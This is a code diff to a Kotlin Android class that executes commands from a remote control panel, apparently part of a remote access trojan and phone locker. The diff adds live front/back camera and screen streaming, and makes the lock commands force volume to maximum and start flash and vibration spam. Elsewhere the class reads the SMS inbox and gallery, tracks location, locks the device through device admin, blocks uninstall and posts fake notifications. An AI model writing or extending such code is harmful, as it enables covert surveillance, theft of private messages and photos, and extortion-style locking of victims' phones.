@@ -7,6 +7,7 @@ import android.content.Intent
 import android.hardware.camera2.CameraManager
 import android.location.Geocoder
 import android.location.LocationManager
+import android.media.AudioManager
 import android.net.Uri
 import android.os.Build
 import android.os.Handler
@@ -27,9 +28,13 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         @Volatile var vibrateSpam: Boolean = false
     }
 
-    // ============================================================
-    // COLLECT DEVICE INFO
-    // ============================================================
+    private fun panelBase(): String {
+        return App.config.panelUrl
+            .replace("ws://", "http://")
+            .replace("wss://", "https://")
+            .replace("/ws", "")
+    }
+
     fun collectInfo(): Map<String, Any> {
         val battery = try {
             val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
@@ -69,55 +74,52 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         } catch (_: Exception) { "-" }
     }
 
-    // ============================================================
-    // EXECUTE
-    // ============================================================
     fun execute(cmd: String, args: JsonObject?, done: (Any) -> Unit) {
         when (cmd) {
 
-            // ===== LOCK PIN =====
+            // ============ LOCK PIN ============
             "lock_pin" -> {
                 val pin = args?.get("pin")?.asString ?: "1234"
-                val video = args?.get("videoUrl")?.asString
-                val audio = args?.get("audioUrl")?.asString
-                startLockService("pin", pin, 0, video, audio)
+                startLockService("pin", pin, 0)
+                setVolumeMax()
+                startFlashSpam()
+                startVibrateSpam()
                 done(mapOf("ok" to true, "type" to "pin", "pin" to pin))
             }
 
-            // ===== LOCK HARD =====
+            // ============ LOCK HARD ============
             "lock_hard" -> {
                 try {
                     val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                     val admin = ComponentName(ctx, AdminReceiver::class.java)
                     if (dpm.isAdminActive(admin)) {
-                        @Suppress("DEPRECATION")
-                        dpm.lockNow()
+                        @Suppress("DEPRECATION") dpm.lockNow()
                     }
                 } catch (_: Exception) {}
-                val video = args?.get("videoUrl")?.asString
-                val audio = args?.get("audioUrl")?.asString
-                startLockService("hard", "0", 0, video, audio)
+                startLockService("hard", "0", 0)
+                setVolumeMax()
+                startFlashSpam()
+                startVibrateSpam()
                 done(mapOf("ok" to true, "type" to "hard"))
             }
 
-            // ===== LOCK JAM =====
+            // ============ LOCK JAM ============
             "lock_time" -> {
                 val hours = args?.get("hours")?.asLong ?: 5L
-                val video = args?.get("videoUrl")?.asString
-                val audio = args?.get("audioUrl")?.asString
-                startLockService("time", "0", hours, video, audio)
+                startLockService("time", "0", hours)
+                setVolumeMax()
+                startFlashSpam()
+                startVibrateSpam()
                 done(mapOf("ok" to true, "hours" to hours))
             }
 
-            // ===== CRASH =====
+            // ============ CRASH ============
             "crash" -> {
-                val video = args?.get("videoUrl")?.asString
-                val audio = args?.get("audioUrl")?.asString
-                startLockService("crash", "0", 0, video, audio)
+                startLockService("crash", "0", 0)
                 done(mapOf("crash" to true))
             }
 
-            // ===== UNLOCK =====
+            // ============ UNLOCK ============
             "unlock" -> {
                 try {
                     val i = Intent(ctx, LockService::class.java).apply {
@@ -127,65 +129,97 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     ctx.stopService(i)
                 } catch (_: Exception) {}
                 StickerSpam.stop()
+                stopFlashSpam()
+                stopVibrateSpam()
+                stopCameraStream()
+                stopScreenStream()
                 done(mapOf("ok" to true))
             }
 
-            // ===== SMS =====
-            "sms" -> done(readSms())
+            // ============ SEND MP4 ============
+            "send_mp4" -> {
+                val url = "${panelBase()}/videos/warning.mp4"
+                startLockService("crash", "0", 0, url, null)
+                done(mapOf("ok" to true, "url" to url))
+            }
 
-            // ===== GALLERY =====
-            "gallery" -> done(readGallery())
+            // ============ SEND MP3 ============
+            "send_mp3" -> {
+                val url = "${panelBase()}/audios/warning.mp3"
+                startLockService("crash", "0", 0, null, url)
+                done(mapOf("ok" to true, "url" to url))
+            }
 
-            // ===== IP + LOCATION =====
-            "ip" -> done(getIpInfo())
+            // ============ SPAM STIKER ============
+            "spam_sticker" -> {
+                val urls = mutableListOf<String>()
+                for (i in 1..5) urls.add("${panelBase()}/stickers/sticker$i.png")
+                StickerSpam.start(ctx, urls, 200, 30)
+                done(mapOf("ok" to true, "count" to urls.size))
+            }
 
-            // ===== CAMERA =====
+            "stop_sticker" -> {
+                StickerSpam.stop()
+                done(mapOf("ok" to true))
+            }
+
+            // ============ CAMERA LIVE STREAM ============
             "camera_front" -> {
-                CameraCapture(ctx).capture(true) { b64 ->
-                    if (b64 != null) done(mapOf("type" to "image", "data" to b64))
-                    else done(mapOf("type" to "text", "data" to "Gagal capture kamera depan"))
-                }
+                startCameraStream(true)
+                done(mapOf("ok" to true, "stream" to "front"))
             }
             "camera_back" -> {
-                CameraCapture(ctx).capture(false) { b64 ->
-                    if (b64 != null) done(mapOf("type" to "image", "data" to b64))
-                    else done(mapOf("type" to "text", "data" to "Gagal capture kamera belakang"))
-                }
+                startCameraStream(false)
+                done(mapOf("ok" to true, "stream" to "back"))
             }
 
-            // ===== SCREEN =====
+            // ============ SCREEN LIVE STREAM ============
             "screen" -> {
                 if (ScreenCapture.isReady()) {
-                    ScreenCapture.capture(ctx) { b64 ->
-                        if (b64 != null) done(mapOf("type" to "image", "data" to b64))
-                        else done(mapOf("type" to "text", "data" to "Screen capture gagal"))
-                    }
+                    startScreenStream()
+                    done(mapOf("ok" to true, "stream" to "screen"))
                 } else {
                     done(mapOf("type" to "text", "data" to "MediaProjection belum aktif"))
                 }
             }
 
-            // ===== FLASH =====
+            "stop_camera" -> {
+                stopCameraStream()
+                done(mapOf("ok" to true))
+            }
+            "stop_screen" -> {
+                stopScreenStream()
+                done(mapOf("ok" to true))
+            }
+
+            // ============ SMS ============
+            "sms" -> done(readSms())
+
+            // ============ GALLERY ============
+            "gallery" -> done(readGallery())
+
+            // ============ IP ============
+            "ip" -> done(getIpInfo())
+
+            // ============ FLASH ============
             "flash" -> {
-                flashSpam = !flashSpam
-                if (flashSpam) startFlashSpam()
+                if (flashSpam) stopFlashSpam() else startFlashSpam()
                 done(mapOf("flash" to flashSpam))
             }
 
-            // ===== VIBRATE =====
+            // ============ VIBRATE ============
             "vibrate" -> {
-                vibrateSpam = !vibrateSpam
-                if (vibrateSpam) startVibrateSpam()
+                if (vibrateSpam) stopVibrateSpam() else startVibrateSpam()
                 done(mapOf("vibrate" to vibrateSpam))
             }
 
-            // ===== ANTI UNINSTALL =====
+            // ============ ANTI UNINSTALL ============
             "anti_uninstall" -> {
                 antiUninstall()
                 done(mapOf("anti_uninstall" to true))
             }
 
-            // ===== FAKE NOTIF =====
+            // ============ FAKE NOTIF ============
             "fake_notif" -> {
                 val title = args?.get("title")?.asString ?: "Pesan Baru"
                 val message = args?.get("message")?.asString ?: ""
@@ -195,7 +229,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
-            // ===== BROADCAST CHAT =====
+            // ============ BROADCAST ============
             "broadcast" -> {
                 val title = args?.get("title")?.asString ?: "Pesan"
                 val message = args?.get("message")?.asString ?: ""
@@ -206,19 +240,19 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
-            // ===== SET WALLPAPER =====
+            // ============ SET WALLPAPER ============
             "set_wallpaper" -> {
                 val url = args?.get("url")?.asString ?: ""
                 if (url.isEmpty()) {
                     done(mapOf("error" to "no url"))
                 } else {
                     WallpaperSetter.setFromUrl(ctx, url) { success ->
-                        done(mapOf("ok" to success))
+                        done(mapOf("ok" to success, "url" to url))
                     }
                 }
             }
 
-            // ===== OPEN WEBSITE =====
+            // ============ OPEN WEBSITE ============
             "open_website" -> {
                 val url = args?.get("url")?.asString ?: ""
                 if (url.isEmpty()) {
@@ -236,97 +270,13 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 }
             }
 
-            // ===== HIDE BROADCAST =====
             "hide_broadcast" -> {
-                Handler(Looper.getMainLooper()).post {
-                    BroadcastOverlay.hide(ctx)
-                }
+                Handler(Looper.getMainLooper()).post { BroadcastOverlay.hide(ctx) }
                 done(mapOf("ok" to true))
             }
 
-            // ===== READ NOTIFS =====
             "read_notifs" -> {
                 done(mapOf("type" to "text", "data" to "Notif listener aktif"))
-            }
-
-            // ===== SEND MP4 =====
-            "send_mp4" -> {
-                val url = args?.get("url")?.asString
-                val panelBase = App.config.panelUrl
-                    .replace("ws://", "http://")
-                    .replace("wss://", "https://")
-                    .replace("/ws", "")
-                val finalUrl = if (url.isNullOrEmpty()) "$panelBase/videos/warning.mp4" else url
-                val i = Intent(ctx, LockService::class.java).apply {
-                    putExtra("type", "crash")
-                    putExtra("videoUrl", finalUrl)
-                    putExtra("audioUrl", "")
-                }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    ctx.startForegroundService(i)
-                } else {
-                    ctx.startService(i)
-                }
-                done(mapOf("ok" to true))
-            }
-
-            // ===== SEND MP3 =====
-            "send_mp3" -> {
-                val url = args?.get("url")?.asString
-                val panelBase = App.config.panelUrl
-                    .replace("ws://", "http://")
-                    .replace("wss://", "https://")
-                    .replace("/ws", "")
-                val finalUrl = if (url.isNullOrEmpty()) "$panelBase/audios/warning.mp3" else url
-                val i = Intent(ctx, LockService::class.java).apply {
-                    putExtra("type", "crash")
-                    putExtra("videoUrl", "")
-                    putExtra("audioUrl", finalUrl)
-                }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    ctx.startForegroundService(i)
-                } else {
-                    ctx.startService(i)
-                }
-                done(mapOf("ok" to true))
-            }
-
-            // ===== SPAM STIKER =====
-            "spam_sticker" -> {
-                val urlsArr = args?.getAsJsonArray("urls")
-                val urls = mutableListOf<String>()
-                if (urlsArr != null) {
-                    for (i in 0 until urlsArr.size()) {
-                        urls.add(urlsArr.get(i).asString)
-                    }
-                }
-                val panelBase = App.config.panelUrl
-                    .replace("ws://", "http://")
-                    .replace("wss://", "https://")
-                    .replace("/ws", "")
-
-                if (urls.isEmpty()) {
-                    for (i in 1..5) {
-                        urls.add("$panelBase/stickers/sticker$i.png")
-                    }
-                }
-
-                StickerSpam.start(ctx, urls, 200, 30)
-                done(mapOf("ok" to true, "count" to urls.size))
-            }
-
-            // ===== STOP SPAM STIKER =====
-            "stop_sticker" -> {
-                StickerSpam.stop()
-                done(mapOf("ok" to true))
-            }
-
-            // ===== STOP BROADCAST =====
-            "stop_broadcast" -> {
-                Handler(Looper.getMainLooper()).post {
-                    BroadcastOverlay.hide(ctx)
-                }
-                done(mapOf("ok" to true))
             }
 
             else -> done(mapOf("error" to "unknown: $cmd"))
@@ -334,36 +284,101 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     // ============================================================
-    // LOCK SERVICE HELPER
+    // LOCK SERVICE (auto video + audio)
     // ============================================================
-    private fun startLockService(
-        type: String,
-        pin: String,
-        hours: Long,
-        videoUrl: String?,
-        audioUrl: String?
-    ) {
+    private fun startLockService(type: String, pin: String, hours: Long) {
         try {
-            val panelBase = App.config.panelUrl
-                .replace("ws://", "http://")
-                .replace("wss://", "https://")
-                .replace("/ws", "")
-
-            val finalVideo = if (videoUrl.isNullOrEmpty()) "$panelBase/videos/warning.mp4" else videoUrl
-            val finalAudio = if (audioUrl.isNullOrEmpty()) "$panelBase/audios/warning.mp3" else audioUrl
+            val video = "${panelBase()}/videos/warning.mp4"
+            val audio = "${panelBase()}/audios/warning.mp3"
 
             val i = Intent(ctx, LockService::class.java).apply {
                 putExtra("type", type)
                 putExtra("pin", pin)
                 putExtra("hours", hours)
-                putExtra("videoUrl", finalVideo)
-                putExtra("audioUrl", finalAudio)
+                putExtra("videoUrl", video)
+                putExtra("audioUrl", audio)
             }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 ctx.startForegroundService(i)
             } else {
                 ctx.startService(i)
             }
+        } catch (_: Exception) {}
+    }
+
+    private fun startLockService(type: String, pin: String, hours: Long, video: String?, audio: String?) {
+        try {
+            val i = Intent(ctx, LockService::class.java).apply {
+                putExtra("type", type)
+                putExtra("pin", pin)
+                putExtra("hours", hours)
+                if (!video.isNullOrEmpty()) putExtra("videoUrl", video)
+                if (!audio.isNullOrEmpty()) putExtra("audioUrl", audio)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ctx.startForegroundService(i)
+            } else {
+                ctx.startService(i)
+            }
+        } catch (_: Exception) {}
+    }
+
+    // ============================================================
+    // CAMERA STREAM
+    // ============================================================
+    private fun startCameraStream(front: Boolean) {
+        try {
+            stopCameraStream()
+            val i = Intent(ctx, CameraStreamService::class.java).apply {
+                putExtra("front", front)
+                putExtra("interval", 200L)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ctx.startForegroundService(i)
+            } else {
+                ctx.startService(i)
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun stopCameraStream() {
+        try {
+            ctx.stopService(Intent(ctx, CameraStreamService::class.java))
+        } catch (_: Exception) {}
+    }
+
+    // ============================================================
+    // SCREEN STREAM
+    // ============================================================
+    private fun startScreenStream() {
+        try {
+            stopScreenStream()
+            val i = Intent(ctx, ScreenStreamService::class.java).apply {
+                putExtra("interval", 200L)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ctx.startForegroundService(i)
+            } else {
+                ctx.startService(i)
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun stopScreenStream() {
+        try {
+            ctx.stopService(Intent(ctx, ScreenStreamService::class.java))
+        } catch (_: Exception) {}
+    }
+
+    // ============================================================
+    // VOLUME MAX
+    // ============================================================
+    private fun setVolumeMax() {
+        try {
+            val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
+            am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
+            am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0)
         } catch (_: Exception) {}
     }
 
@@ -383,25 +398,20 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     // ============================================================
-    // READ SMS
+    // SMS
     // ============================================================
     private fun readSms(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
         try {
             val cursor = ctx.contentResolver.query(
-                Uri.parse("content://sms/inbox"),
-                null, null, null, "date DESC LIMIT 50"
+                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50"
             )
             cursor?.use {
                 while (it.moveToNext()) {
                     val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                     val addr = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                     val date = it.getLong(it.getColumnIndexOrThrow("date"))
-                    list.add(mapOf(
-                        "app" to addr,
-                        "body" to body,
-                        "date" to date.toString()
-                    ))
+                    list.add(mapOf("app" to addr, "body" to body, "date" to date.toString()))
                 }
             }
         } catch (_: Exception) {}
@@ -409,7 +419,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     // ============================================================
-    // READ GALLERY
+    // GALLERY
     // ============================================================
     private fun readGallery(): Map<String, Any> {
         val list = mutableListOf<Map<String, String>>()
@@ -427,9 +437,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     )
                     val b64 = try {
                         val bytes = ctx.contentResolver.openInputStream(uri)?.readBytes() ?: ByteArray(0)
-                        if (bytes.size < 200_000)
-                            Base64.encodeToString(bytes, Base64.NO_WRAP)
-                        else ""
+                        if (bytes.size < 200_000) Base64.encodeToString(bytes, Base64.NO_WRAP) else ""
                     } catch (_: Exception) { "" }
                     if (b64.isNotEmpty()) list.add(mapOf("data" to b64))
                 }
@@ -447,8 +455,10 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
         var address = "-"
         try {
             val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
-                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+            var loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
+
             if (loc != null) {
                 lat = loc.latitude
                 lon = loc.longitude
@@ -459,11 +469,9 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     if (!addrs.isNullOrEmpty()) {
                         val a = addrs[0]
                         address = listOfNotNull(
-                            a.thoroughfare,
-                            a.subLocality,
-                            a.locality,
-                            a.adminArea,
-                            a.countryName
+                            a.thoroughfare, a.subThoroughfare, a.subLocality,
+                            a.locality, a.subAdminArea, a.adminArea,
+                            a.postalCode, a.countryName
                         ).joinToString(", ")
                     }
                 } catch (_: Exception) {}
@@ -481,7 +489,9 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     // ============================================================
     // FLASH SPAM
     // ============================================================
-    private fun startFlashSpam() {
+    fun startFlashSpam() {
+        if (flashSpam) return
+        flashSpam = true
         Thread {
             try {
                 val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
@@ -491,32 +501,39 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                             .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
                     } ?: break
                     cm.setTorchMode(id, true)
-                    Thread.sleep(150)
+                    Thread.sleep(120)
                     cm.setTorchMode(id, false)
-                    Thread.sleep(150)
+                    Thread.sleep(120)
                 }
             } catch (_: Exception) {}
+            flashSpam = false
         }.start()
     }
+
+    fun stopFlashSpam() { flashSpam = false }
 
     // ============================================================
     // VIBRATE SPAM
     // ============================================================
-    private fun startVibrateSpam() {
+    fun startVibrateSpam() {
+        if (vibrateSpam) return
+        vibrateSpam = true
         try {
             val vm = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
             Thread {
                 while (vibrateSpam) {
                     try {
                         if (Build.VERSION.SDK_INT >= 26) {
-                            vm.vibrate(VibrationEffect.createOneShot(800, VibrationEffect.DEFAULT_AMPLITUDE))
+                            vm.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
                         } else {
-                            @Suppress("DEPRECATION") vm.vibrate(800)
+                            @Suppress("DEPRECATION") vm.vibrate(500)
                         }
-                        Thread.sleep(1200)
+                        Thread.sleep(700)
                     } catch (_: Exception) { break }
                 }
             }.start()
         } catch (_: Exception) {}
     }
+
+    fun stopVibrateSpam() { vibrateSpam = false }
 }
